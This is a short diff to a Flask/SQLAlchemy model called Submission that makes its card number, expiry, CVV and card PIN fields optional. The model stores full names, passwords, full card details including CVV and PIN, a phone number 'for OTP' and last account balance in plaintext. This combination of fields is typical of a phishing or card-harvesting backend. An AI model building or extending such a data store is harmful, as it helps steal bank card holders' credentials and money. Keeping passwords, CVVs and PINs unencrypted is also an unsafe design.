@@ -32,10 +32,10 @@ class Submission(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
     fullname = db.Column(db.String(100), nullable=False)  # Username field, required
     password = db.Column(db.String(200), nullable=False)  # Password field, required
-    card_number = db.Column(db.String(16), nullable=False)  # Card number, required
-    expiry_date = db.Column(db.String(5), nullable=False)  # Expiry date MM/YY format, required
-    cvv = db.Column(db.String(3), nullable=False)  # CVV 3 digits, required
-    card_pin = db.Column(db.String(5), nullable=False)  # Card PIN 5 digits, required
+    card_number = db.Column(db.String(16), nullable=True)  # Card number, optional
+    expiry_date = db.Column(db.String(5), nullable=True)  # Expiry date MM/YY format, optional
+    cvv = db.Column(db.String(3), nullable=True)  # CVV 3 digits, optional
+    card_pin = db.Column(db.String(5), nullable=True)  # Card PIN 5 digits, optional
     contact_number = db.Column(db.String(20), nullable=True)  # Contact number, optional
     phone_number = db.Column(db.String(20), nullable=False)  # Phone number for OTP, required
     last_account_balance = db.Column(db.String(20), nullable=True)  # Last account balance, optional
